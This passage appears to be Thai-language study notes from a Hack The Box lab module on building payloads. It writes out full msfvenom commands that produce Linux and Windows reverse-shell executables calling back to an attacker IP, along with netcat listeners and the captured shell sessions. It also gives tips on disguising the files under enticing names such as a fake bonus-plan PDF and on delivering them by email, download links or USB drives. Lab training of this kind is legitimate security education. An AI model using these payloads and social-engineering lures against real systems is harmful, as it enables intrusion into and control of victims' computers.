### การแยกวิเคราะห์คำสั่ง:

| ส่วน | ความหมาย |
|------|----------|
| `msfvenom` | เครื่องมือสร้าง payload |
| `-p` | สร้าง payload |
| `linux/x64/shell_reverse_tcp` | Linux 64-bit stageless payload ที่จะสร้าง TCP reverse shell |
| `LHOST=10.10.14.113` | IP address ของเครื่องโจมตีที่จะรับการเชื่อมต่อ |
| `LPORT=443` | Port ที่จะรับการเชื่อมต่อ |
| `-f elf` | รูปแบบของไฟล์ที่จะสร้าง = `.elf` (Linux executable) |
| `> createbackup.elf` | ชื่อไฟล์ output |

### เคล็ดลับการตั้งชื่อไฟล์:

**ตั้งชื่อให้:**
- ไม่น่าสงสัย (inconspicuous)
- ดูน่าสนใจ/จูงใจให้ดาวน์โหลดและรัน
- **ตัวอย่าง:** `createbackup.elf`, `system_update.elf`, `important_document.elf`

---

## วิธีส่ง Payload ไปยังเป้าหมาย

### ช่องทางที่นิยมใช้:

**1. Email:**
- แนบไฟล์ในอีเมล
- Social engineering

**2. Website:**
- ลิงก์ดาวน์โหลดบนเว็บไซต์
- Drive-by download

**3. Metasploit Exploit Module:**
- ใช้ร่วมกับ exploit module
- ต้องอยู่ในเครือข่ายภายในแล้ว

**4. Physical Access:**
- Flash drive
- ส่วนหนึ่งของ onsite penetration test

**5. อื่นๆ:**
- File sharing services
- Messaging apps
- Remote desktop

---

## การรัน Payload บน Linux

### สถานการณ์ตัวอย่าง:

**เป้าหมาย:**
- Ubuntu box ที่ IT admin ใช้
- ใช้จัดการ network devices
- เก็บ configuration scripts
- เข้าถึง routers & switches

**วิธีโจมตี:**
- ส่งอีเมลพร้อมไฟล์แนบ
- Admin ใช้เครื่องนี้เหมือนเครื่องส่วนตัว (ประมาท)
- Admin คลิกไฟล์

### เตรียม Listener

```bash
sudo nc -lvnp 443
```

### เมื่อเหยื่อรันไฟล์:

```bash
sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
env
PWD=/home/htb-student/Downloads
cd ..
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
```

**✅ สำเร็จ!** ได้ shell แล้ว

---

## สร้าง Payload สำหรับ Windows

### สร้าง Windows Executable

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

**Output:**
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

### การแยกวิเคราะห์คำสั่ง:

| ส่วน | ความหมาย |
|------|----------|
| `windows/shell_reverse_tcp` | Windows stageless reverse TCP shell payload |
| `-f exe` | รูปแบบไฟล์ = `.exe` (Windows executable) |
| `BonusCompensationPlanpdf.exe` | ชื่อไฟล์ที่ดู "น่าสนใจ" สำหรับ social engineering |

### หมายเหตุสำคัญ:

**⚠️ ปัญหา Windows Defender:**
- Payload แบบนี้ (ไม่มี encoding/encryption) จะ**ถูก Windows Defender จับได้แน่นอน**
- ต้องใช้เทคนิค evasion เพิ่มเติม (จะเรียนในหัวข้อถัดไป)

---

## การรัน Payload บน Windows

### สถานการณ์:

1. ส่ง payload ไปยังเป้าหมาย
2. เหยื่อดับ AV (หรือใช้ evasion techniques)
3. เหยื่อดับเบิลคลิกไฟล์

### เตรียม Listener

```bash
sudo nc -lvnp 443
```

### เมื่อเหยื่อรันไฟล์:

```bash
sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DD25-26EB

 Directory of C:\Users\htb-student\Downloads

09/23/2021  10:26 AM    <DIR>          .
09/23/2021  10:26 AM    <DIR>          ..
09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe
               1 File(s)         73,802 bytes
               2 Dir(s)   9,997,516,800 bytes free
```

**✅ สำเร็จ!** ได้ Windows shell แล้ว

---

